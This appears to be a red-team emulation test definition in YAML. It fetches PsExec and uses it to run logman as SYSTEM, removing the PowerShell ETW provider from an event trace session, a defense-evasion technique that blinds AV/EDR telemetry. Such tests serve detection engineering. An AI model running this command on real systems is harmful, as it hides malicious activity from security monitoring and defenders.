api_version: "2.0"
name: Disable Powershell ETW Provider - Windows
description: This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.
args:
    - name: ps_exec_location
      type: string
      default: PathToAtomicsFolder\..\ExternalPayloads\pstools\PsExec.exe
    - name: session
      type: string
      default: EventLog-Application
    - name: provider
      type: string
      default: Microsoft-Windows-Powershell
uuid: 6f118276-121d-4c09-bb58-a8fb4a72ee84
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1562: Impair Defenses'
    subtechniques:
        - 'T1562.006: Indicator Blocking'
requirements:
    platforms:
        - os: windows
steps:
    - name: PSExec must be installed on the machine.
      inline: |-
        if (Test-Path "#{ps_exec_location}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PStools.zip"
        expand-archive -literalpath "PathToAtomicsFolder\..\ExternalPayloads\PStools.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\pstools" -force}}
      executor: powershell
    - name: disable-powershell-etw-provider---windows
      inline: cmd /c "{{.Args.ps_exec_location}}" -accepteula -i -s cmd.exe /c logman update trace "{{.Args.session}}" --p "{{.Args.provider}}" -ets
      executor: powershell
      cleanup:
        inline: cmd /c "{{.Args.ps_exec_location}}" -i -s cmd.exe /c logman update trace "{{.Args.session}}" -p "{{.Args.provider}}" -ets
        executor: powershell
